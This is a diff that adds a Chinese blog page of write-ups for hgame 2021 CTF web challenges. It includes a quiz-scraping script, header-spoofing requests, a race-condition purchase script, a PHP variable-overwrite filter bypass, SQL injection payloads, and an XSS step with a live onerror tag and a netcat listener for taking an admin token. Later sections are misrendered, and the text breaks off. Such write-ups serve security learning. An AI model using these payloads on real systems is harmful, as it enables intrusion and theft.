@@ -1,0 +1,1375 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+<html class="theme-next muse" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2">
+
+<link rel="stylesheet" href="/css/main.css?v=7.1.1">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo.png?v=7.1.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo.png?v=7.1.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=7.1.1" color="#222">
+
+
+
+
+
+
+
+<script id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '7.1.1',
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false,"dimmer":false},
+    back2top: true,
+    back2top_sidebar: true,
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+                history.back();
+            }
+        }
+    })();
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="hgame2021">
+<meta name="keywords" content="ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hgame-2021">
+<meta property="og:url" content="https://zo1ro.github.io/2021/02/21/hgame-2021/index.html">
+<meta property="og:site_name" content="ZO1RO">
+<meta property="og:description" content="hgame2021">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://zo1ro.github.io/2021/02/21/hgame-2021/x">
+<meta property="og:updated_time" content="2021-02-23T15:38:46.385Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hgame-2021">
+<meta name="twitter:description" content="hgame2021">
+<meta name="twitter:image" content="https://zo1ro.github.io/2021/02/21/hgame-2021/x">
+
+
+
+  <link rel="alternate" href="/atom.xml" title="ZO1RO" type="application/atom+xml">
+
+
+
+  
+  
+  <link rel="canonical" href="https://zo1ro.github.io/2021/02/21/hgame-2021/">
+
+
+
+<script id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>hgame-2021 | ZO1RO</title>
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .motion-element,
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-title { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZO1RO</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+      
+        <p class="site-subtitle">一个向往acm的ctf_dog</p>
+      
+    
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Home</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-about">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/about/" rel="section"><i class="menu-item-icon fa fa-fw fa-user"></i> <br>About</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-tags">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/tags/" rel="section"><i class="menu-item-icon fa fa-fw fa-tags"></i> <br>Tags</a>
+
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+
+    
+    
+    
+      
+    
+
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archives</a>
+
+  </li>
+
+      
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Search</a>
+        </li>
+      
+    </ul>
+  
+
+  
+    
+
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="Searching..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://zo1ro.github.io/2021/02/21/hgame-2021/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ZO1RO">
+      <meta itemprop="description" content="永远做好最坏的打算">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZO1RO">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">hgame-2021
+
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2021-02-21 15:56:27" itemprop="dateCreated datePublished" datetime="2021-02-21T15:56:27+08:00">2021-02-21</time>
+            
+
+            
+          </span>
+
+          
+
+          
+            
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>hgame2021</p>
+ <a id="more"></a>
+<h3 id="week1-智商检测鸡"><a href="#week1-智商检测鸡" class="headerlink" title="week1-智商检测鸡"></a>week1-智商检测鸡</h3><p>定积分爬虫计算（<code>py2</code>一直算不出来，<code>py3</code>才算出来）脚本如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">#! /usr/bin/python3</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">#&#123;&quot;question&quot;:&quot;&lt;math&gt;&lt;mrow&gt;&lt;msubsup&gt;&lt;mo&gt;\u222b&lt;/mo&gt;&lt;mrow&gt;</span><br><span class="line">#&lt;mo&gt;-&lt;/mo&gt;&lt;mn&gt;92&lt;/mn&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mn&gt;31&lt;/mn&gt;&lt;/mrow&gt;</span><br><span class="line">#&lt;/msubsup&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mn&gt;12&lt;/mn&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;17&lt;/mn&gt;</span><br><span class="line">#&lt;mo&gt;)&lt;/mo&gt;&lt;mtext&gt;&lt;mi&gt;d&lt;/mi&gt;&lt;/mtext&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mtd/&gt;&lt;/mrow&gt;&lt;/math&gt;&quot;&#125;</span><br><span class="line"></span><br><span class="line">session = requests.session()</span><br><span class="line">url1 = &apos;http://r4u.top:5000/api/getQuestion&apos;</span><br><span class="line">url2 = &apos;http://r4u.top:5000/api/verify&apos;</span><br><span class="line">cookie = &#123;&apos;session&apos;:&apos;eyJzb2x2aW5nIjowfQ.YCO0Rg.GB0csnF1HSr6v9-rMHaA9O72POI&apos;&#125;</span><br><span class="line"></span><br><span class="line">i = 0</span><br><span class="line">while i &lt;103:</span><br><span class="line">	html1 = requests.get(url1,cookies=cookie).text</span><br><span class="line">	x2 = int(re.findall(r&apos;&lt;mn&gt;(.*?)&lt;/mn&gt;&apos;,html1)[0])*-1</span><br><span class="line">	x1 = int(re.findall(r&apos;&lt;mn&gt;(.*?)&lt;/mn&gt;&apos;,html1)[1])</span><br><span class="line">	a = int(re.findall(r&apos;&lt;mn&gt;(.*?)&lt;/mn&gt;&apos;,html1)[2])</span><br><span class="line">	b = int(re.findall(r&apos;&lt;mn&gt;(.*?)&lt;/mn&gt;&apos;,html1)[3])</span><br><span class="line">	answer = a/2*x1*x1+b*x1-a/2*x2*x2-b*x2</span><br><span class="line">	answer = round(answer, 3)</span><br><span class="line">	#print(answer)</span><br><span class="line">	data = &#123;&quot;answer&quot;: answer&#125;</span><br><span class="line">	#print(data)</span><br><span class="line">	r1 = requests.post(url2,json=data,cookies=cookie)</span><br><span class="line">	#print(r1.content)</span><br><span class="line">	cookie = requests.utils.dict_from_cookiejar(r1.cookies)</span><br><span class="line">	status = requests.get(&apos;http://r4u.top:5000/api/getStatus&apos;,cookies=cookie).text</span><br><span class="line">	print(status)</span><br><span class="line">	#print(cookie)</span><br><span class="line">	i += 1</span><br></pre></td></tr></table></figure>
+<p>也可用<code>F12</code>控制台进行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.getElementsByTagName(&quot;button&quot;)[0].onclick = function()&#123; var r = document.getElementById(&quot;integral&quot;).querySelectorAll(&quot;mn&quot;); var l = -parseFloat(r[0].innerHTML); var u = parseFloat(r[1].innerHTML); var a = parseFloat(r[2].innerHTML); var b = parseFloat(r[3].innerHTML); document.getElementById(&quot;answer&quot;).value = (a*(u*u-l*l)/2+b*(u- l)).toString(); submit(); &#125;;</span><br></pre></td></tr></table></figure>
+<p>最终</p>
+<blockquote>
+<p>hgame{3very0ne_H4tes_Math}</p>
+</blockquote>
+<h3 id="week1-Hitchhiking-in-the-Galaxy"><a href="#week1-Hitchhiking-in-the-Galaxy" class="headerlink" title="week1-Hitchhiking_in_the_Galaxy"></a>week1-Hitchhiking_in_the_Galaxy</h3><p>使用<code>GET</code>访问<code>/HitchhikerGuide.php</code>返回</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;&lt;title&gt;405 Method Not Allowed&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body bgcolor=&quot;white&quot;&gt;</span><br><span class="line">&lt;center&gt;</span><br><span class="line">    &lt;h1&gt;405 Not Allowed&lt;/h1&gt;</span><br><span class="line">    &lt;p&gt;顺风车不是这么搭的&lt;/p&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;hr&gt;</span><br><span class="line">&lt;center&gt;nginx/1.14.0 (Ubuntu)&lt;/center&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<p>改为<code>POST</code>返回</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只有使用&quot;无限非概率引擎&quot;(Infinite Improbability Drive)才能访问这里～</span><br></pre></td></tr></table></figure>
+<p>将<code>UA</code>改为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: Infinite Improbability Drive</span><br></pre></td></tr></table></figure>
+<p>返回</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你知道吗？&lt;a href=&quot;https://github.com/wuhan005&quot;&gt;茄子&lt;/a&gt;特别要求：你得从他的&lt;a href=&quot;https://cardinal.ink/&quot;&gt;Cardinal&lt;/a&gt;过来</span><br></pre></td></tr></table></figure>
+<p>继续改<code>Referer</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Referer: https://cardinal.ink/</span><br><span class="line">//flag仅能通过本地访问获得</span><br></pre></td></tr></table></figure>
+<p>加上</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">X-Forwarded-For:127.0.0.1</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>hgame{s3Cret_0f_HitCHhiking_in_the_GAl@xy_i5_dOnT_p@nic!}</p>
+</blockquote>
+<p>最终</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /HitchhikerGuide.php HTTP/1.1</span><br><span class="line">Host: hitchhiker42.0727.site:42420</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line">User-Agent: Infinite Improbability Drive</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: https://cardinal.ink/</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br></pre></td></tr></table></figure>
+<h3 id="week2-Liki的生日礼物"><a href="#week2-Liki的生日礼物" class="headerlink" title="week2-Liki的生日礼物"></a>week2-Liki的生日礼物</h3><p>兑换界面存在条件竞争，参考脚本</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding: utf-8 -*- </span><br><span class="line">import threading </span><br><span class="line">import requests </span><br><span class="line">url = &apos;https://birthday.liki.link&apos; </span><br><span class="line">headers = &#123; &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded; charset=UTF-8&apos;, &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36 Edg/88.0.705.63&apos;, &apos;Cookie&apos;: &apos;PHPSESSID=10vh4i8m7tg5as1028budrfvot&apos;&#125;</span><br><span class="line"></span><br><span class="line">def buy(): </span><br><span class="line">	data = &#123;&apos;amount&apos;: 1&#125; </span><br><span class="line">	requests.post(url=url + &apos;/API/?m=buy&apos;, headers=headers, data=data) </span><br><span class="line"></span><br><span class="line">def multithreading(): </span><br><span class="line">	threads = [] </span><br><span class="line">	for t in range(52): </span><br><span class="line">		t = threading.Thread(target=buy)</span><br><span class="line">		t.start() </span><br><span class="line">		threads.append(t) </span><br><span class="line">	for thread in threads: </span><br><span class="line">		thread.join() </span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;: </span><br><span class="line">	multithreading()</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>Liki非常开心并把flag给了你:hgame{L0ck_1s_TH3_S0lllut!on!!!}</p>
+</blockquote>
+<h3 id="week2-LazyDogR4U"><a href="#week2-LazyDogR4U" class="headerlink" title="week2-LazyDogR4U"></a>week2-LazyDogR4U</h3><hr>
+<p>源码在<code>www.zip</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">www</span><br><span class="line">├── Config.php--配置定义</span><br><span class="line">├── User.php--判断用户登录</span><br><span class="line">├── config.ini--没什么用</span><br><span class="line">├── flag.php--如下</span><br><span class="line">├── index.php--符合config里定义的用户即可进入flag.php</span><br><span class="line">├── lazy.php--如下</span><br><span class="line">└── static</span><br><span class="line">    └── style.css</span><br><span class="line"></span><br><span class="line">1 directory, 7 files</span><br></pre></td></tr></table></figure>
+<p>这里重点看<code>flag.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line">require_once &apos;lazy.php&apos;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($_SESSION[&apos;username&apos;]))&#123;</span><br><span class="line">    die(&apos;您配吗？&apos;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">    if($_SESSION[&apos;username&apos;] === &apos;admin&apos;)&#123;</span><br><span class="line">        echo &quot;&lt;h3 style=&apos;color: white&apos;&gt;admin将于今日获取自己忠实的flag&lt;/h3&gt;&quot;;</span><br><span class="line">        echo &quot;&lt;h3 style=&apos;color: white&apos;&gt;$flag&lt;/h3&gt;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        if($submit == &quot;getflag&quot;)&#123;</span><br><span class="line">            echo &quot;&lt;h3 style=&apos;color: white&apos;&gt;&#123;$_SESSION[&apos;username&apos;]&#125;接近了问题的终点&lt;/h3&gt;&quot;;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            echo &quot;&lt;h3 style=&apos;color: white&apos;&gt;篡位者占领了神圣的页面&lt;/h3&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">        ?&gt;</span><br></pre></td></tr></table></figure>
+<p>只判断<code>admin</code>即可进行获取<code>flag</code>，这里看<code>lazy.php</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$filter = [&quot;SESSION&quot;, &quot;SEVER&quot;, &quot;COOKIE&quot;, &quot;GLOBALS&quot;];</span><br><span class="line"></span><br><span class="line">// 直接注册所有变量，这样我就能少打字力，芜湖~</span><br><span class="line"></span><br><span class="line">foreach(array(&apos;_GET&apos;,&apos;_POST&apos;) as $_request)&#123;</span><br><span class="line">    foreach ($$_request as $_k =&gt; $_v)&#123;</span><br><span class="line">        foreach ($filter as $youBadBad)&#123;</span><br><span class="line">            $_k = str_replace($youBadBad, &apos;&apos;, $_k);</span><br><span class="line">        &#125;</span><br><span class="line">        $&#123;$_k&#125; = $_v;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 自动加载类，这样我也能少打字力，芜湖~</span><br><span class="line">function auto($class_name)&#123;</span><br><span class="line">    require_once $class_name . &quot;.php&quot;;</span><br><span class="line">&#125;</span><br><span class="line">spl_autoload_register(&apos;auto&apos;);</span><br></pre></td></tr></table></figure>
+<p>看到可以进行变量覆盖，通过<code>_GET，_POST</code>进行输入变量，如<code>_SESSION1=admin</code>，经过处理后变成<code>_1=admin</code>，这里我们双写绕过，然后通过覆盖变量方式<code>$_SESSION[&#39;username&#39;]</code>改为<code>admin</code>。<code>payload</code>如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url?_SESSSESSIONION[username]=admin</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>hgame{R4U_|$-A-l4zY~DoG}</p>
+</blockquote>
+<h3 id="week2-200OK"><a href="#week2-200OK" class="headerlink" title="week2-200OK!!"></a>week2-200OK!!</h3><hr>
+<p><code>status</code>字段引起<code>response</code>变化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">GET /server.php HTTP/1.1</span><br><span class="line">Host: 200ok.liki.link</span><br><span class="line">Connection: close</span><br><span class="line">Status: 4</span><br><span class="line">sec-ch-ua-mobile: ?0</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.182 Safari/537.36</span><br><span class="line">sec-ch-ua: &quot;Chromium&quot;;v=&quot;88&quot;, &quot;Google Chrome&quot;;v=&quot;88&quot;, &quot;;Not A Brand&quot;;v=&quot;99&quot;</span><br><span class="line">Accept: */*</span><br><span class="line">Sec-Fetch-Site: same-origin</span><br><span class="line">Sec-Fetch-Mode: cors</span><br><span class="line">Sec-Fetch-Dest: empty</span><br><span class="line">Referer: https://200ok.liki.link/</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Length: 18</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Date: Sun, 21 Feb 2021 09:52:08 GMT</span><br><span class="line">Server: Caddy</span><br><span class="line">Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">HTTP 403 Forbidden</span><br><span class="line"></span><br><span class="line">* * * * * * * * * * * *</span><br><span class="line"></span><br><span class="line">Status: 2</span><br><span class="line"></span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Content-Length: 20</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line">Date: Sun, 21 Feb 2021 09:52:33 GMT</span><br><span class="line">Server: Caddy</span><br><span class="line">Server: Apache/2.4.29 (Ubuntu)</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">HTTP 400 Bad Request</span><br></pre></td></tr></table></figure>
+<p>可能有注入，测试过滤字符串有</p>
+<p><code>[&#39;select&#39;, &#39;SELECT&#39;, &#39;from&#39;, &#39;FROM&#39;, &#39;union&#39;, &#39;UNION&#39;, &#39;where&#39;, &#39;WHERE&#39;, &#39; &#39;]</code><br>大写可绕</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">-1&apos;/***/uniOn/***/seLect/***/group_concat(table_name)/***/frOm/***/information_schema.tables/***/whEre/***/table_schema=&apos;week2sqli&apos;#</span><br><span class="line"></span><br><span class="line">//f1111111144444444444g,status</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&apos;/***/uniOn/***/seLect/***/group_concat(column_name)/***/frOm/***/information_schema.columns/**/whEre/**/table_name=&apos;f1111111144444444444g&apos;#</span><br><span class="line"></span><br><span class="line">//ffffff14gggggg</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">-1&apos;/***/uniOn/***/seLect/***/ffffff14gggggg/***/frOm/***/f1111111144444444444g#</span><br><span class="line"></span><br><span class="line">//hgame&#123;Con9raTu1ati0n5+yoU_FXXK~Up-tH3,5Q1!!=)&#125;</span><br><span class="line">​</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&gt; hgame&#123;Con9raTu1ati0n5+yoU_FXXK~Up-tH3,5Q1!!=)&#125;</span><br><span class="line"></span><br><span class="line">### week2-Post to zuckonit</span><br><span class="line"></span><br><span class="line">------</span><br><span class="line"></span><br><span class="line">`xss`，输入的`scrip`t脚本会逆序输出，并且过滤了`http，script`等字段，`http`链接可以用`//`进行替换，同样可以进行访问，并用`img`标签插入，并利用逆序字符串事先将字段逆序，从而引发`xss`漏洞，通过本地监听端口获取admin的`token`</span><br></pre></td></tr></table></figure>
+<p><img src="x" onerror="alert(1)"><br>返回</p>
+<blockquote>
+<p>“)1(trela”=rorreon x=crs gmi&lt;<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">本地监听</span><br></pre></td></tr></table></figure></p>
+</blockquote>
+<p>nc -lk 8091<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">最终</span><br></pre></td></tr></table></figure></p>
+<blockquote>
